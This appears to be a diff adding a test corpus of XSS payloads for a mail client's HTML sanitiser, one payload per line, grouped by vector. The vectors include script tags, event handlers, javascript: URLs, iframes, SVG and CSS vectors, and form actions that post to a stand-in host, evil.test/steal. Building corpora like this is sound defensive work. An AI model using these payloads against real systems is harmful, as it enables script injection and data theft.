@@ -1,0 +1,103 @@
+# The XSS corpus. docs/06 Phase 6: "write that corpus first and commit it".
+#
+# One payload per line. Blank lines and lines starting with # are ignored, so a payload cannot
+# begin with a hash -- none of the vectors below need to, and the alternative is an escaping
+# scheme that would itself need testing.
+#
+# These are the shapes hostile mail actually arrives in. A mail client is the softest target
+# there is for this: the attacker chooses every byte of the input, the user is expected to open
+# it, and the content is rendered as markup by design. The sanitiser's allowlist is the whole
+# defence, so what matters is not that these particular strings are blocked but that the
+# allowlist admits nothing outside it -- these are the cases that catch an allowlist which has
+# quietly grown a hole.
+#
+# Each is checked in tests/xss_corpus.rs against `render`, the function the reader actually
+# calls, rather than against `sanitise` alone. A payload that survives image rewriting or quote
+# folding would be just as dangerous as one that survives the sanitiser.
+
+# --- script elements, in the obvious and less obvious spellings -----------------------------
+<script>alert(1)</script>
+<SCRIPT>alert(1)</SCRIPT>
+<script src="https://evil.test/x.js"></script>
+<script type="text/javascript">alert(1)</script>
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<script/xss src="https://evil.test/x.js"></script>
+<script >alert(1)</script>
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+<template><script>alert(1)</script></template>
+
+# --- event handlers on otherwise permitted elements ------------------------------------------
+<img src="x" onerror="alert(1)">
+<img src=x onerror=alert(1)>
+<img src="x" ONERROR="alert(1)">
+<img src="x" onerror = "alert(1)">
+<body onload="alert(1)">
+<div onmouseover="alert(1)">hover</div>
+<p onclick="alert(1)">click</p>
+<a href="#" onfocus="alert(1)" autofocus>x</a>
+<input onfocus="alert(1)" autofocus>
+<svg onload="alert(1)"></svg>
+<table background="javascript:alert(1)"><tr><td>x</td></tr></table>
+<div style="width: expression(alert(1))">x</div>
+<img src="x" onerror="&#97;lert(1)">
+
+# --- javascript: and other executable URL schemes ---------------------------------------------
+<a href="javascript:alert(1)">click</a>
+<a href="JaVaScRiPt:alert(1)">click</a>
+<a href="java&#115;cript:alert(1)">click</a>
+<a href="&#106;avascript:alert(1)">click</a>
+<a href=" javascript:alert(1)">leading space</a>
+<a href="vbscript:msgbox(1)">click</a>
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click</a>
+<a href="data:text/html,<script>alert(1)</script>">click</a>
+<img src="javascript:alert(1)">
+<form action="javascript:alert(1)"><input type=submit></form>
+
+# --- framing, embedding and anything that loads another document ------------------------------
+<iframe src="https://evil.test/"></iframe>
+<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>
+<iframe src="javascript:alert(1)"></iframe>
+<object data="https://evil.test/x.swf"></object>
+<embed src="https://evil.test/x.swf">
+<applet code="Evil.class"></applet>
+<frame src="https://evil.test/">
+<frameset><frame src="https://evil.test/"></frameset>
+<portal src="https://evil.test/"></portal>
+
+# --- svg, mathml and the xml-adjacent vectors -------------------------------------------------
+<svg><script>alert(1)</script></svg>
+<svg><use href="data:image/svg+xml;base64,PHN2Zy8+"/></svg>
+<svg><animate onbegin="alert(1)" attributeName="x"/></svg>
+<svg><set onbegin="alert(1)" attributeName="x"/></svg>
+<svg><foreignObject><script>alert(1)</script></foreignObject></svg>
+<math><mtext><script>alert(1)</script></mtext></math>
+<math href="javascript:alert(1)"><mtext>x</mtext></math>
+
+# --- style, link and anything that can pull or execute CSS -------------------------------------
+<style>body { background: url("https://evil.test/beacon.png"); }</style>
+<style>@import url("https://evil.test/x.css");</style>
+<link rel="stylesheet" href="https://evil.test/x.css">
+<div style="background-image: url('https://evil.test/beacon.png')">x</div>
+<div style="behavior: url(#default#time2)">x</div>
+<style>@font-face { src: url("https://evil.test/x.woff"); }</style>
+
+# --- meta, base and things that change how the whole document behaves --------------------------
+<meta http-equiv="refresh" content="0;url=https://evil.test/">
+<base href="https://evil.test/">
+<meta charset="utf-7">
+<meta http-equiv="Content-Security-Policy" content="default-src *">
+
+# --- form controls, which can exfiltrate without any script at all ------------------------------
+<form action="https://evil.test/steal" method="post"><input name="x"><input type=submit></form>
+<button formaction="https://evil.test/steal">x</button>
+<input type="image" src="https://evil.test/beacon.png">
+<isindex action="https://evil.test/steal">
+
+# --- mutation and parser-confusion vectors ------------------------------------------------------
+<div><!--<img src="--><img src=x onerror=alert(1)//">
+<![CDATA[<script>alert(1)</script>]]>
+<xmp><img src=x onerror=alert(1)></xmp>
+<listing><img src=x onerror=alert(1)></listing>
+<textarea></textarea><img src=x onerror=alert(1)>
+<title></title><img src=x onerror=alert(1)>
+<style></style><img src=x onerror=alert(1)>
